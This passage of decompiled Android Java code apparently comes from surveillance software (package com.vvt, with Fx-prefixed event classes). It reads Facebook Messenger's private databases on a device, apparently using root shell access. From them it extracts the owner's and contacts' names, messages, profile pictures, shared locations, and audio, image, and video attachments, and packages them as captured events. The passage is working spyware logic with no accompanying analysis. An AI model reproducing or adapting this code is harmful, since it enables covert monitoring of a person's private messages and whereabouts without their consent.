    {
      localObject2 = "shares";
      paramString1 = b(paramSQLiteDatabase1, paramString3, (String)localObject2);
    }
    boolean bool3 = a;
    if (bool3) {}
    Object localObject2 = ICallLogData.Direction.OUT;
    int n;
    if (paramDirection == localObject2) {
      if (paramString1 != null)
      {
        n = paramString1.length();
        if (n > k)
        {
          n = 0;
          localObject2 = null;
        }
      }
    }
    for (;;)
    {
      try
      {
        JSONArray localJSONArray = new org/json/JSONArray;
        localJSONArray.<init>(paramString1);
        if (localJSONArray == null) {
          continue;
        }
        i1 = i;
        int i3 = localJSONArray.length();
        if (i3 <= 0) {
          continue;
        }
        i &= i1;
        if (i == 0) {
          break label407;
        }
        i = 0;
        localObject3 = null;
        localObject3 = localJSONArray.get(0);
        localObject3 = (JSONObject)localObject3;
        str = "href";
        bool1 = ((JSONObject)localObject3).has(str);
        if (!bool1) {
          break label407;
        }
        localObject2 = "href";
        localObject3 = ((JSONObject)localObject3).getString((String)localObject2);
        if (localObject3 != null)
        {
          localObject2 = "null";
          if (localObject3 != localObject2) {
            continue;
          }
        }
        localObject3 = "pending_shares";
        paramString1 = b(paramSQLiteDatabase1, paramString3, (String)localObject3);
        i = a;
        if (i != 0) {}
        localObject1 = b(paramString2, paramString1, paramSQLiteDatabase2);
      }
      catch (JSONException localJSONException)
      {
        Object localObject3;
        int i2;
        i = c;
        if (i == 0) {
          continue;
        }
        continue;
      }
      i = a;
      if (i != 0) {}
      return (List)localObject1;
      i2 = 0;
      continue;
      i = 0;
      localObject3 = null;
      continue;
      i = a;
      if (i != 0)
      {
        continue;
        i = a;
        if (i != 0) {}
        Object localObject4 = b(paramSQLiteDatabase1, paramString3, "pending_shares");
        if (localObject4 != null)
        {
          n = ((String)localObject4).length();
          if (n <= k) {}
        }
        for (localObject4 = b(paramString2, (String)localObject4, paramSQLiteDatabase2);; localObject4 = localObject1)
        {
          localObject1 = localObject4;
          break;
          if (paramString1 == null) {
            break;
          }
          j = paramString1.length();
          if (j <= k) {
            break;
          }
          localObject1 = b(paramString2, paramString1, paramSQLiteDatabase2);
          break;
        }
        label407:
        int j = 0;
        localObject4 = null;
      }
    }
  }
  
  private static List a(SQLiteDatabase paramSQLiteDatabase, String paramString1, String paramString2, ICallLogData.Direction paramDirection, String paramString3, String paramString4, String paramString5, String paramString6, String paramString7, com.vvt.base.b paramb, String paramString8)
  {
    boolean bool1 = a;
    if (bool1) {}
    Object localObject1 = new java/util/ArrayList;
    ((ArrayList)localObject1).<init>();
    boolean bool2 = a;
    int i;
    int n;
    Object localObject2;
    if ((!bool2) || (paramString3 != null))
    {
      i = paramString3.length();
      n = 3;
      if (i >= n) {}
    }
    else if (paramString1 != null)
    {
      i = paramString1.length();
      n = 3;
      if (i >= n) {}
    }
    else
    {
      long l = 3000L;
      SystemClock.sleep(l);
      paramString1 = b(paramSQLiteDatabase, paramString5, "attachments");
      localObject2 = ICallLogData.Direction.OUT;
      if (paramDirection == localObject2)
      {
        localObject2 = "pending_send_media_attachment";
        paramString3 = b(paramSQLiteDatabase, paramString5, (String)localObject2);
      }
    }
    for (String str = paramString1;; str = paramString1)
    {
      localObject2 = ICallLogData.Direction.OUT;
      if (paramDirection == localObject2) {
        if (str != null)
        {
          i = str.length();
          n = 2;
          if (i > n)
          {
            localObject1 = paramString5;
            localObject2 = paramString6;
            localObject1 = a(paramString5, paramString6, paramString4, str, paramString7, paramb, paramString8);
          }
        }
      }
      for (;;)
      {
        boolean bool3 = a;
        if (bool3) {}
        return (List)localObject1;
        int j;
        if (paramString3 != null)
        {
          j = paramString3.length();
          if (j > 0)
          {
            localObject1 = a(paramString6, paramString3, paramb);
            continue;
          }
        }
        c(paramSQLiteDatabase, paramString5);
        localObject2 = "attachments";
        str = b(paramSQLiteDatabase, paramString5, (String)localObject2);
        if (str != null)
        {
          j = str.length();
          n = 2;
          if (j > n)
          {
            localObject1 = paramString5;
            localObject2 = paramString6;
            localObject1 = a(paramString5, paramString6, paramString4, str, paramString7, paramb, paramString8);
            continue;
          }
        }
        localObject2 = b(paramSQLiteDatabase, paramString5, "pending_send_media_attachment");
        if (localObject2 != null)
        {
          n = ((String)localObject2).length();
          int i1 = 2;
          if (n > i1)
          {
            localObject1 = a(paramString6, (String)localObject2, paramb);
            continue;
          }
        }
        boolean bool4 = com.vvt.ag.b.a(paramString2);
        if (!bool4)
        {
          int k = paramString2.length();
          n = 5;
          if (k > n)
          {
            localObject1 = b(paramString2, paramString6);
            continue;
            if (str != null)
            {
              k = str.length();
              n = 3;
              if (k >= n) {}
            }
            else
            {
              c(paramSQLiteDatabase, paramString5);
              localObject2 = "attachments";
              str = b(paramSQLiteDatabase, paramString5, (String)localObject2);
            }
            if (str != null)
            {
              k = str.length();
              n = 2;
              if (k > n)
              {
                localObject1 = paramString5;
                localObject2 = paramString6;
                localObject1 = a(paramString5, paramString6, paramString4, str, paramString7, paramb, paramString8);
              }
            }
            boolean bool5 = com.vvt.ag.b.a(paramString2);
            if (!bool5)
            {
              int m = paramString2.length();
              n = 5;
              if (m > n) {
                localObject1 = b(paramString2, paramString6);
              }
            }
          }
        }
      }
    }
  }
  
  private static List a(SQLiteDatabase paramSQLiteDatabase1, String paramString1, String paramString2, com.vvt.im.events.info.d paramd, String paramString3, SQLiteDatabase paramSQLiteDatabase2)
  {
    boolean bool1 = false;
    String str1 = null;
    int i = a;
    if (i != 0) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    if (paramString2 != null) {
      i = 0;
    }
    for (;;)
    {
      try
      {
        new byte[0];
        JSONArray localJSONArray = new org/json/JSONArray;
        localJSONArray.<init>(paramString2);
        i = 0;
        bool1 = false;
        str1 = null;
        int k = localJSONArray.length();
        if (i < k)
        {
          localObject1 = new org/json/JSONObject;
          Object localObject2 = localJSONArray.getJSONObject(i);
          localObject2 = ((JSONObject)localObject2).toString();
          ((JSONObject)localObject1).<init>((String)localObject2);
          localObject2 = "user_key";
          try
          {
            localObject4 = ((JSONObject)localObject1).getString((String)localObject2);
            localObject2 = ":";
            m = ((String)localObject4).indexOf((String)localObject2) + 1;
            localObject2 = ((String)localObject4).substring(m);
            str2 = "name";
            str2 = ((JSONObject)localObject1).getString(str2);
            localObject5 = "email";
            boolean bool3 = ((JSONObject)localObject1).has((String)localObject5);
            if (bool3)
            {
              localObject5 = "email";
              str1 = ((JSONObject)localObject1).getString((String)localObject5);
            }
            localObject1 = ((String)localObject2).trim();
            localObject5 = paramd.b();
            localObject5 = ((String)localObject5).trim();
            bool4 = ((String)localObject1).equalsIgnoreCase((String)localObject5);
            if (!bool4) {
              continue;
            }
          }
          catch (Exception localException)
          {
            Object localObject4;
            int m;
            String str2;
            Object localObject5;
            int j;
            int n;
            boolean bool2 = c;
            if (!bool2) {
              continue;
            }
            continue;
            bool2 = false;
            Object localObject3 = null;
            continue;
          }
          i += 1;
          continue;
          localObject1 = a(paramSQLiteDatabase1, (String)localObject4, paramString1, paramString3, paramSQLiteDatabase2);
          if (localObject1 == null) {
            break label428;
          }
          n = localObject1.length;
          if (n <= 0) {
            break label428;
          }
          localObject4 = ImType.FACEBOOK;
          localObject5 = ImMediaFileType.USER_PROFILE;
          localObject4 = com.vvt.im.a.c.a(paramString1, (ImType)localObject4, (ImMediaFileType)localObject5);
          localObject5 = ImMediaFileType.USER_PROFILE;
          localObject5 = com.vvt.im.a.c.a((ImMediaFileType)localObject5);
          localObject1 = com.vvt.io.d.a((byte[])localObject1, (String)localObject4, (String)localObject5);
          localObject4 = new com/vvt/im/events/info/e;
          ((com.vvt.im.events.info.e)localObject4).<init>();
          if (localObject2 == null) {
            localObject2 = "-1";
          }
          ((com.vvt.im.events.info.e)localObject4).d((String)localObject2);
          ((com.vvt.im.events.info.e)localObject4).c(str2);
          if (0 == 0)
          {
            localObject2 = str1;
            ((com.vvt.im.events.info.e)localObject4).b((String)localObject2);
            ((com.vvt.im.events.info.e)localObject4).a((String)localObject1);
            m = 0;
            localObject2 = null;
            ((com.vvt.im.events.info.e)localObject4).a(null);
            localArrayList.add(localObject4);
            continue;
          }
        }
        bool1 = a;
      }
      catch (JSONException localJSONException) {}
      if (bool1) {}
      bool1 = a;
      if (bool1) {}
      return localArrayList;
      label428:
      boolean bool4 = false;
      Object localObject1 = null;
    }
  }
  
  public static List a(com.vvt.capture.b.d paramd)
  {
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    Object localObject1 = new com/vvt/events/FxIMAccountEvent;
    ((FxIMAccountEvent)localObject1).<init>();
    long l1 = paramd.h();
    ((FxIMAccountEvent)localObject1).setEventTime(l1);
    int i = FxIMMessageServiceType.FACEBOOK.getValue();
    ((FxIMAccountEvent)localObject1).setImServiceId(i);
    Object localObject2 = paramd.d().a();
    ((FxIMAccountEvent)localObject1).setOwnerDisplayName((String)localObject2);
    localObject2 = paramd.d().b();
    ((FxIMAccountEvent)localObject1).setOwnerId((String)localObject2);
    localObject2 = paramd.d().c();
    ((FxIMAccountEvent)localObject1).setOwnerProfilePicture((byte[])localObject2);
    localObject2 = paramd.d().g();
    ((FxIMAccountEvent)localObject1).setOwnerProfilePicturePath((String)localObject2);
    localObject2 = paramd.d().d();
    ((FxIMAccountEvent)localObject1).setOwnerStatusMessage((String)localObject2);
    localArrayList.add(localObject1);
    localObject2 = new com/vvt/events/FxIMConversationEvent;
    ((FxIMConversationEvent)localObject2).<init>();
    localObject1 = paramd.j().a();
    ((FxIMConversationEvent)localObject2).setConversationId((String)localObject1);
    localObject1 = paramd.j().c();
    ((FxIMConversationEvent)localObject2).setConversationProfilePicture((byte[])localObject1);
    localObject1 = paramd.j().d();
    ((FxIMConversationEvent)localObject2).setConversationProfilePicturePath((String)localObject1);
    localObject1 = paramd.j().b();
    ((FxIMConversationEvent)localObject2).setConversationTitle((String)localObject1);
    localObject1 = paramd.j().e();
    ((FxIMConversationEvent)localObject2).setConversationStatusMessage((String)localObject1);
    l1 = paramd.h();
    ((FxIMConversationEvent)localObject2).setEventTime(l1);
    int j = FxIMMessageServiceType.FACEBOOK.getValue();
    ((FxIMConversationEvent)localObject2).setImServiceId(j);
    localObject1 = paramd.d().b();
    ((FxIMConversationEvent)localObject2).setOwnerId((String)localObject1);
    Object localObject3 = new java/util/HashSet;
    ((HashSet)localObject3).<init>();
    localObject1 = paramd.c();
    Object localObject4 = ((List)localObject1).iterator();
    boolean bool1;
    for (;;)
    {
      bool1 = ((Iterator)localObject4).hasNext();
      if (!bool1) {
        break;
      }
      localObject1 = (com.vvt.im.events.info.e)((Iterator)localObject4).next();
      localObject5 = ((com.vvt.im.events.info.e)localObject1).d();
      localObject6 = paramd.d().b();
      boolean bool4 = ((String)localObject5).equalsIgnoreCase((String)localObject6);
      if (!bool4)
      {
        localObject1 = ((com.vvt.im.events.info.e)localObject1).d();
        ((HashSet)localObject3).add(localObject1);
      }
    }
    ((FxIMConversationEvent)localObject2).setParticipantContactIds((HashSet)localObject3);
    localArrayList.add(localObject2);
    localObject1 = paramd.c();
    localObject2 = ((List)localObject1).iterator();
    for (;;)
    {
      bool1 = ((Iterator)localObject2).hasNext();
      if (!bool1) {
        break;
      }
      localObject1 = (com.vvt.im.events.info.e)((Iterator)localObject2).next();
      localObject3 = ((com.vvt.im.events.info.e)localObject1).d();
      localObject4 = paramd.d().b();
      boolean bool5 = ((String)localObject3).equalsIgnoreCase((String)localObject4);
      if (!bool5)
      {
        localObject3 = new com/vvt/events/FxIMContactEvent;
        ((FxIMContactEvent)localObject3).<init>();
        localObject4 = ((com.vvt.im.events.info.e)localObject1).c();
        ((FxIMContactEvent)localObject3).setContactDisplayName((String)localObject4);
        localObject4 = ((com.vvt.im.events.info.e)localObject1).d();
        ((FxIMContactEvent)localObject3).setContactId((String)localObject4);
        localObject4 = ((com.vvt.im.events.info.e)localObject1).e();
        ((FxIMContactEvent)localObject3).setContactProfilePicture((byte[])localObject4);
        localObject4 = ((com.vvt.im.events.info.e)localObject1).a();
        ((FxIMContactEvent)localObject3).setContactProfilePicturePath((String)localObject4);
        localObject1 = ((com.vvt.im.events.info.e)localObject1).f();
        ((FxIMContactEvent)localObject3).setContactStatusMessage((String)localObject1);
        long l2 = paramd.h();
        ((FxIMContactEvent)localObject3).setEventTime(l2);
        int k = FxIMMessageServiceType.FACEBOOK.getValue();
        ((FxIMContactEvent)localObject3).setImServiceId(k);
        localObject1 = paramd.d().b();
        ((FxIMContactEvent)localObject3).setOwnerId((String)localObject1);
        localArrayList.add(localObject3);
      }
    }
    localObject3 = new com/vvt/events/FxIMMessageEvent;
    ((FxIMMessageEvent)localObject3).<init>();
    localObject4 = new java/util/ArrayList;
    ((ArrayList)localObject4).<init>();
    localObject1 = paramd.f();
    localObject2 = ((List)localObject1).iterator();
    for (;;)
    {
      bool2 = ((Iterator)localObject2).hasNext();
      if (!bool2) {
        break;
      }
      localObject1 = (com.vvt.im.events.info.a)((Iterator)localObject2).next();
      localObject5 = new com/vvt/events/d;
      ((com.vvt.events.d)localObject5).<init>();
      localObject6 = ((com.vvt.im.events.info.a)localObject1).e();
      ((com.vvt.events.d)localObject5).b((byte[])localObject6);
      localObject6 = ((com.vvt.im.events.info.a)localObject1).a();
      ((com.vvt.events.d)localObject5).a((String)localObject6);
      localObject6 = ((com.vvt.im.events.info.a)localObject1).c();
      ((com.vvt.events.d)localObject5).b((String)localObject6);
      localObject6 = ((com.vvt.im.events.info.a)localObject1).b();
      ((com.vvt.events.d)localObject5).c((String)localObject6);
      localObject6 = ((com.vvt.im.events.info.a)localObject1).f();
      ((com.vvt.events.d)localObject5).d((String)localObject6);
      localObject1 = ((com.vvt.im.events.info.a)localObject1).d();
      ((com.vvt.events.d)localObject5).a((byte[])localObject1);
      ((List)localObject4).add(localObject5);
    }
    boolean bool2 = false;
    localObject1 = null;
    i = paramd.k();
    int n = MessageType.ShareLocation.getNumber();
    i &= n;
    Object localObject5 = MessageType.ShareLocation;
    n = ((MessageType)localObject5).getNumber();
    if (i == n)
    {
      localObject1 = new com/vvt/events/e;
      ((com.vvt.events.e)localObject1).<init>();
      f = paramd.l().d();
      ((com.vvt.events.e)localObject1).a(f);
      double d1 = paramd.l().a();
      ((com.vvt.events.e)localObject1).a(d1);
      d1 = paramd.l().b();
      ((com.vvt.events.e)localObject1).b(d1);
      localObject2 = paramd.l().c();
      ((com.vvt.events.e)localObject1).a((String)localObject2);
    }
    localObject5 = new com/vvt/events/e;
    ((com.vvt.events.e)localObject5).<init>();
    localObject2 = paramd.e().d().c();
    ((com.vvt.events.e)localObject5).a((String)localObject2);
    double d2 = paramd.e().d().a();
    ((com.vvt.events.e)localObject5).a(d2);
    d2 = paramd.e().d().b();
    ((com.vvt.events.e)localObject5).b(d2);
    float f = paramd.e().d().d();
    ((com.vvt.events.e)localObject5).a(f);
    localObject2 = paramd.j().a();
    ((FxIMMessageEvent)localObject3).setConversationId((String)localObject2);
    localObject2 = paramd.i();
    Object localObject6 = ICallLogData.Direction.IN;
    if (localObject2 == localObject6) {}
    for (localObject2 = FxEventDirection.IN;; localObject2 = FxEventDirection.OUT)
    {
      ((FxIMMessageEvent)localObject3).setDirection((FxEventDirection)localObject2);
      long l3 = paramd.h();
      ((FxIMMessageEvent)localObject3).setEventTime(l3);
      i = FxIMMessageServiceType.FACEBOOK.getValue();
      ((FxIMMessageEvent)localObject3).setImServiceId(i);
      localObject2 = paramd.a();
      ((FxIMMessageEvent)localObject3).setMessage((String)localObject2);
      ((FxIMMessageEvent)localObject3).setMessageLocation((com.vvt.events.e)localObject5);
      ((FxIMMessageEvent)localObject3).setShareLocation((com.vvt.events.e)localObject1);
      int m = paramd.k();
      ((FxIMMessageEvent)localObject3).setTextRepresentation(m);
      localObject1 = paramd.i();
      localObject2 = ICallLogData.Direction.IN;
      if (localObject1 == localObject2)
      {
        localObject1 = paramd.e().a();
        ((FxIMMessageEvent)localObject3).setSenderId((String)localObject1);
      }
      localObject2 = ((List)localObject4).iterator();
      for (;;)
      {
        boolean bool3 = ((Iterator)localObject2).hasNext();
        if (!bool3) {
          break;
        }
        localObject1 = (com.vvt.events.d)((Iterator)localObject2).next();
        ((FxIMMessageEvent)localObject3).addAttachment((com.vvt.events.d)localObject1);
      }
    }
    localArrayList.add(localObject3);
    return localArrayList;
  }
  
  public static List a(String paramString1, String paramString2, long paramLong1, long paramLong2, int paramInt, com.vvt.base.b paramb, String paramString3)
  {
    bool1 = a;
    if (bool1) {}
    bool1 = a;
    if (bool1) {}
    localArrayList1 = new java/util/ArrayList;
    localArrayList1.<init>();
    localSQLiteDatabase1 = null;
    localSQLiteDatabase2 = null;
    localSQLiteDatabase3 = null;
    localSQLiteDatabase4 = null;
    Object localObject1 = "threads_db2";
    try
    {
      localSQLiteDatabase1 = com.vvt.p.c.a(paramString2, (String)localObject1);
      localObject1 = "prefs_db";
      localSQLiteDatabase2 = com.vvt.p.c.a(paramString2, (String)localObject1);
      localObject1 = "stickers_db";
      localSQLiteDatabase3 = com.vvt.p.c.a(paramString2, (String)localObject1);
      localObject1 = "contacts_db2";
      localSQLiteDatabase4 = com.vvt.p.c.a(paramString2, (String)localObject1);
      localObject1 = paramString1;
      localObject1 = a(paramString1, paramString2, localSQLiteDatabase3, localSQLiteDatabase2, localSQLiteDatabase1, paramLong1, paramLong2, paramInt, paramb, paramString3, localSQLiteDatabase4);
    }
    catch (Exception localException)
    {
      for (;;)
      {
        boolean bool2;
        bool1 = c;
        if ((!bool1) || (localSQLiteDatabase1 != null)) {
          localSQLiteDatabase1.close();
        }
        if (localSQLiteDatabase2 != null) {
          localSQLiteDatabase2.close();
        }
        if (localSQLiteDatabase3 != null) {
          localSQLiteDatabase3.close();
        }
        if (localSQLiteDatabase4 != null) {
          localSQLiteDatabase4.close();
        }
        ArrayList localArrayList2 = localArrayList1;
      }
    }
    finally
    {
      if (localSQLiteDatabase1 == null) {
        break label255;
      }
      localSQLiteDatabase1.close();
      if (localSQLiteDatabase2 == null) {
        break label265;
      }
      localSQLiteDatabase2.close();
      if (localSQLiteDatabase3 == null) {
        break label275;
      }
      localSQLiteDatabase3.close();
      if (localSQLiteDatabase4 == null) {
        break label285;
      }
      localSQLiteDatabase4.close();
    }
    bool2 = a;
    if (bool2) {}
    bool2 = a;
    if (bool2) {}
    return (List)localObject1;
  }
  
  public static List a(String paramString1, String paramString2, SQLiteDatabase paramSQLiteDatabase1, SQLiteDatabase paramSQLiteDatabase2, SQLiteDatabase paramSQLiteDatabase3, long paramLong1, long paramLong2, int paramInt, com.vvt.base.b paramb, String paramString3, SQLiteDatabase paramSQLiteDatabase4)
  {
    boolean bool1 = a;
    if (bool1) {}
    long l = 30000L;
    SystemClock.sleep(l);
    ArrayList localArrayList1 = new java/util/ArrayList;
    localArrayList1.<init>();
    ArrayList localArrayList2 = new java/util/ArrayList;
    localArrayList2.<init>();
    Cursor localCursor = null;
    if (paramSQLiteDatabase3 != null) {}
    for (;;)
    {
      try
      {
        boolean bool4 = a(paramSQLiteDatabase3);
        bool1 = a;
        if (bool1) {}
        Object localObject1 = a(paramSQLiteDatabase3, bool4);
        boolean bool5 = a;
        if (bool5) {}
        int k = 3;
        Object localObject3 = new String[k];
        int m = 0;
        Object localObject4 = null;
        Object localObject5 = Long.toString(paramLong1);
        localObject3[0] = localObject5;
        m = 1;
        localObject5 = Long.toString(paramLong2);
        localObject3[m] = localObject5;
        m = 2;
        localObject5 = Integer.toString(paramInt);
        localObject3[m] = localObject5;
        localCursor = paramSQLiteDatabase3.rawQuery((String)localObject1, (String[])localObject3);
        localObject1 = paramSQLiteDatabase3;
        localObject3 = paramString1;
        localObject4 = paramString2;
        localObject5 = paramSQLiteDatabase2;
        localObject1 = a(paramSQLiteDatabase3, localCursor, paramString1, paramString2, paramSQLiteDatabase2, paramSQLiteDatabase1, paramb, paramString3, bool4, paramSQLiteDatabase4);
        localArrayList1.addAll((Collection)localObject1);
        if (localCursor != null) {
          localCursor.close();
        }
        bool1 = a;
        if (bool1) {}
        localObject4 = a(paramSQLiteDatabase3, paramString1, paramString2, paramSQLiteDatabase2, paramSQLiteDatabase1, paramb, paramString3, bool4, paramSQLiteDatabase4);
        localArrayList1.addAll((Collection)localObject4);
        bool1 = a;
        if (bool1) {}
        int i = localArrayList1.size() + -1;
        k = i;
        if (k >= 0)
        {
          localObject1 = localArrayList1.get(k);
          localObject1 = (com.vvt.capture.b.d)localObject1;
          boolean bool6 = a(paramSQLiteDatabase3, (com.vvt.capture.b.d)localObject1);
          if (!bool6)
          {
            localObject5 = ((com.vvt.capture.b.d)localObject1).g();
            localArrayList2.add(localObject5);
            localArrayList1.remove(k);
            b((com.vvt.capture.b.d)localObject1);
            boolean bool2 = a;
            if (!bool2) {}
          }
          int j = k + -1;
          k = j;
        }
        else
        {
          boolean bool3 = a;
          if (bool3) {}
          localObject1 = new com/vvt/im/events/store/StringEventKeys;
          ((StringEventKeys)localObject1).<init>();
          ((StringEventKeys)localObject1).setEventKeys(localArrayList2);
          localObject3 = ImType.FACEBOOK;
          bool3 = com.vvt.im.events.store.a.a((Serializable)localObject1, paramString1, (ImType)localObject3);
          if (!bool3)
          {
            bool3 = a;
            if (bool3) {}
            localObject3 = ((List)localObject4).iterator();
            bool3 = ((Iterator)localObject3).hasNext();
            if (bool3)
            {
              localObject1 = ((Iterator)localObject3).next();
              localObject1 = (com.vvt.capture.b.d)localObject1;
              localArrayList1.remove(localObject1);
              continue;
            }
          }
          if (localCursor == null) {}
        }
      }
      catch (Exception localException)
      {
        bool3 = c;
        if ((!bool3) || (localCursor != null)) {
          localCursor.close();
        }
        bool3 = a;
        if (bool3) {}
        bool3 = a;
        if (bool3) {}
        return localArrayList1;
      }
      finally
      {
        if (localCursor != null) {
          localCursor.close();
        }
      }
    }
  }
  
  private static List a(String paramString1, String paramString2, com.vvt.base.b paramb)
  {
    int i = 0;
    Object localObject1 = null;
    boolean bool3 = a;
    if (bool3) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    if (paramString2 != null) {}
    for (;;)
    {
      boolean bool2;
      try
      {
        JSONArray localJSONArray = new org/json/JSONArray;
        localJSONArray.<init>(paramString2);
        int k = 0;
        i = localJSONArray.length();
        if (k < i)
        {
          try
          {
            localObject1 = localJSONArray.get(k);
            localObject1 = (JSONObject)localObject1;
            localObject2 = "type";
            localObject3 = ((JSONObject)localObject1).getString((String)localObject2);
            localObject2 = "fileName";
            localObject4 = ((JSONObject)localObject1).getString((String)localObject2);
            localObject2 = "mimeType";
            localObject2 = ((JSONObject)localObject1).getString((String)localObject2);
            localObject5 = "uri";
            localObject5 = ((JSONObject)localObject1).getString((String)localObject5);
            if (localObject4 == null) {
              continue;
            }
            localObject1 = "null";
            boolean bool1 = ((String)localObject4).equalsIgnoreCase((String)localObject1);
            if (bool1) {
              continue;
            }
            localObject1 = "/";
            bool1 = ((String)localObject4).contains((CharSequence)localObject1);
            if (bool1) {
              continue;
            }
            if (localObject2 == null) {
              continue;
            }
            localObject1 = "null";
            bool1 = ((String)localObject2).equalsIgnoreCase((String)localObject1);
            if (bool1) {
              continue;
            }
            localObject1 = localObject2;
            if (localObject1 == null) {
              localObject1 = "application/x-binary";
            }
            if (localObject5 == null) {
              break label733;
            }
            localObject2 = new java/net/URI;
            ((URI)localObject2).<init>((String)localObject5);
            localObject3 = new java/io/File;
            ((File)localObject3).<init>((URI)localObject2);
            bool3 = ((File)localObject3).exists();
            if (!bool3) {
              break label733;
            }
            bool3 = false;
            localObject2 = null;
            localObject2 = a(paramString1, false);
            localObject3 = ((File)localObject3).getAbsolutePath();
            com.vvt.io.d.a((String)localObject3, (String)localObject2);
            localObject3 = paramb.f();
            ShellUtil.b((String)localObject3, (String)localObject2);
            int m = b;
            if (m != 0) {}
            localObject3 = "/storage/emulated/0";
            localObject5 = "/sdcard";
            localObject2 = ((String)localObject2).replace((CharSequence)localObject3, (CharSequence)localObject5);
            m = b;
            if (m != 0) {}
            localObject5 = new java/io/File;
            ((File)localObject5).<init>((String)localObject2);
            m = ((File)localObject5).exists();
            if (m != 0)
            {
              long l = ((File)localObject5).length();
              localObject3 = "image";
              m = ((String)localObject1).contains((CharSequence)localObject3);
              if (m == 0) {
                continue;
              }
              m = 1;
              bool4 = a(m, paramb, l);
              boolean bool6 = a;
              if ((!bool6) || (!bool4))
              {
                ((File)localObject5).delete();
                bool3 = false;
                localObject2 = null;
              }
            }
            localObject3 = new com/vvt/im/events/info/a;
            ((com.vvt.im.events.info.a)localObject3).<init>();
            ((com.vvt.im.events.info.a)localObject3).a((String)localObject4);
            ((com.vvt.im.events.info.a)localObject3).b((String)localObject1);
            bool1 = false;
            localObject1 = null;
            ((com.vvt.im.events.info.a)localObject3).d(null);
            bool1 = false;
            localObject1 = null;
            ((com.vvt.im.events.info.a)localObject3).a(null);
            ((com.vvt.im.events.info.a)localObject3).c((String)localObject2);
            bool1 = false;
            localObject1 = null;
            ((com.vvt.im.events.info.a)localObject3).b(null);
            localArrayList.add(localObject3);
            bool1 = b;
            if (!bool1) {}
          }
          catch (Exception localException1)
          {
            Object localObject3;
            Object localObject4;
            Object localObject5;
            boolean bool4;
            int j;
            int n;
            boolean bool5;
            int i1;
            bool2 = c;
            if (!bool2) {
              continue;
            }
            continue;
          }
          j = k + 1;
          k = j;
          continue;
          localObject1 = e((String)localObject5);
          localObject4 = localObject1;
          continue;
          localObject1 = com.vvt.io.d.i((String)localObject4);
          if (localObject1 == null)
          {
            if (localObject3 == null) {
              continue;
            }
            localObject2 = "PHOTO";
            bool3 = ((String)localObject3).equalsIgnoreCase((String)localObject2);
            if (bool3)
            {
              localObject1 = "image/jpeg";
              continue;
            }
            localObject2 = "AUDIO";
            bool3 = ((String)localObject3).equalsIgnoreCase((String)localObject2);
            if (!bool3) {
              continue;
            }
            localObject1 = "audio/mpeg";
            continue;
          }
          if (localObject3 == null) {
            continue;
          }
          localObject2 = "mp4";
          bool3 = ((String)localObject1).contains((CharSequence)localObject2);
          if (!bool3) {
            continue;
          }
          localObject2 = "AUDIO";
          bool3 = ((String)localObject3).equalsIgnoreCase((String)localObject2);
          if (!bool3) {
            continue;
          }
          localObject1 = "audio/mpeg";
          continue;
          localObject3 = "audio";
          bool4 = ((String)localObject1).contains((CharSequence)localObject3);
          if (bool4)
          {
            n = 2;
            continue;
          }
          localObject3 = "video";
          bool5 = ((String)localObject1).contains((CharSequence)localObject3);
          if (bool5)
          {
            i1 = 3;
            continue;
          }
          i1 = 4;
          continue;
        }
        bool2 = a;
      }
      catch (Exception localException2)
      {
        bool2 = c;
        if (!bool2) {}
      }
      if (bool2) {}
      return localArrayList;
      label733:
      bool3 = false;
      Object localObject2 = null;
    }
  }
  
  private static List a(String paramString1, String paramString2, String paramString3, String paramString4, String paramString5, com.vvt.base.b paramb, String paramString6)
  {
    boolean bool1 = a;
    if (bool1) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    if (paramString4 != null)
    {
      int i = paramString4.length();
      int n = 2;
      if (i > n)
      {
        Object localObject1 = "att";
        boolean bool7 = false;
        Object localObject3 = null;
        n = 0;
        Object localObject4 = null;
        for (;;)
        {
          try
          {
            boolean bool2 = a;
            int i2;
            if ((!bool2) || (paramString5 != null))
            {
              int j = paramString5.length();
              i2 = 5;
              if (j >= i2) {}
            }
            else
            {
              paramString5 = a(paramString3, paramString2, paramString6);
            }
            boolean bool3 = a;
            if (bool3) {}
            JSONArray localJSONArray = new org/json/JSONArray;
            localJSONArray.<init>(paramString4);
            bool3 = false;
            localObject1 = null;
            int i5 = 0;
            int k = localJSONArray.length();
            if (i5 < k) {
              try
              {
                localObject1 = localJSONArray.get(i5);
                localObject1 = (JSONObject)localObject1;
                localObject5 = "id";
                localObject6 = ((JSONObject)localObject1).getString((String)localObject5);
                localObject5 = "filename";
                str1 = ((JSONObject)localObject1).getString((String)localObject5);
                localObject5 = "mime_type";
                str2 = ((JSONObject)localObject1).getString((String)localObject5);
                localObject5 = "file_size";
                localObject5 = ((JSONObject)localObject1).getString((String)localObject5);
                i2 = Integer.parseInt((String)localObject5);
                if (str2 != null)
                {
                  str3 = str2.toLowerCase();
                  localObject7 = "audio";
                  boolean bool11 = str3.contains((CharSequence)localObject7);
                  if (bool11)
                  {
                    boolean bool4 = a;
                    if (bool4) {}
                    int m = 2;
                    l = i2;
                    bool5 = a(m, paramb, l);
                    boolean bool13 = a;
                    if ((bool13) && (!bool5)) {
                      continue;
                    }
                    localObject1 = paramb.f();
                    localObject1 = a(paramString2, paramString3, i2, (String)localObject1);
                    localObject4 = localObject3;
                  }
                }
              }
              catch (Exception localException1)
              {
                Object localObject5;
                Object localObject6;
                String str1;
                String str2;
                String str3;
                Object localObject7;
                long l;
                int i1;
                int i3;
                int i6;
                int i8;
                boolean bool12;
                int i9;
                int i7;
                boolean bool14;
                boolean bool6;
                boolean bool9;
                int i4;
                boolean bool10;
                Object localObject2 = localObject4;
                localObject4 = localObject3;
              }
            }
          }
          catch (Exception localException2)
          {
            boolean bool8;
            bool5 = c;
            if (!bool5) {
              break;
            }
          }
          try
          {
            localObject3 = new com/vvt/im/events/info/a;
            ((com.vvt.im.events.info.a)localObject3).<init>();
            ((com.vvt.im.events.info.a)localObject3).a(str1);
            ((com.vvt.im.events.info.a)localObject3).b(str2);
            ((com.vvt.im.events.info.a)localObject3).d((String)localObject4);
            i2 = 0;
            localObject5 = null;
            ((com.vvt.im.events.info.a)localObject3).a(null);
            ((com.vvt.im.events.info.a)localObject3).c((String)localObject1);
            i2 = 0;
            localObject5 = null;
            ((com.vvt.im.events.info.a)localObject3).b(null);
            localArrayList.add(localObject3);
            bool7 = b;
            if (bool7) {}
            i1 = i5 + 1;
            i5 = i1;
            localObject3 = localObject4;
